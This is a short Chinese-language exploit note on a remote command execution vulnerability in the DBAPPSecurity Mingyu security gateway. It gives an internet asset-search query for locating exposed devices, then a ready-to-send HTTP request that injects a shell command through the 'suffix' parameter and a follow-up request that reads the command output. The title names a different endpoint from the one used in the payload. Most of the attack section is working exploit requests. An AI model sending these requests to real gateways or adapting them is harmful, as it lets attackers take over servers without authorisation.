# 安恒明御安全网关aaa_local_web_preview存在远程命令执行漏洞

# 一、漏洞简介
安恒信息明御安全网关<font style="color:rgb(0, 0, 0);">（以下简称“NGFW”）秉持安全可视、简单有效的理念，以资产为视角，构建“事前+事中+事后”全流程防御的下一代安全防护体系，并融合传统防火墙、</font>入侵防御系统<font style="color:rgb(0, 0, 0);">、防病毒网关、上网行为管控、VPN网关、威胁情报等</font>安全模块<font style="color:rgb(0, 0, 0);">于一体的智慧化安全网关。安恒明御安全网关aaa_portal_auth_wchat_submit存在远程命令执行漏洞。攻击者可通过该漏洞获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 安恒明御安全网关

# 三、资产测绘
+ hunter`app.name="安恒明御安全网关"`
+ 特征

![1699939786628-0b13cd03-210c-4d73-9fb2-6198942e15c3.png](./img/jAKWW4JqUQbjCmHl/1699939786628-0b13cd03-210c-4d73-9fb2-6198942e15c3-523650.png)

# 四、漏洞复现
```plain
GET /webui/?g=aaa_portal_auth_wchat_submit&suffix=;echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/stc.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: {hostname}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1703405909643-3e3d865b-260e-419a-b697-5ed23a0a0ecd.png](./img/jAKWW4JqUQbjCmHl/1703405909643-3e3d865b-260e-419a-b697-5ed23a0a0ecd-711461.png)

获取命令执行结果

```plain
GET /sslvpn/stc.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: {hostname}
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1703405938768-9fa01d85-610c-4b95-a221-8a3363171080.png](./img/jAKWW4JqUQbjCmHl/1703405938768-9fa01d85-610c-4b95-a221-8a3363171080-296297.png)



> 更新: 2024-07-17 17:29:07  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rdf0zo1tk2wbzg3g>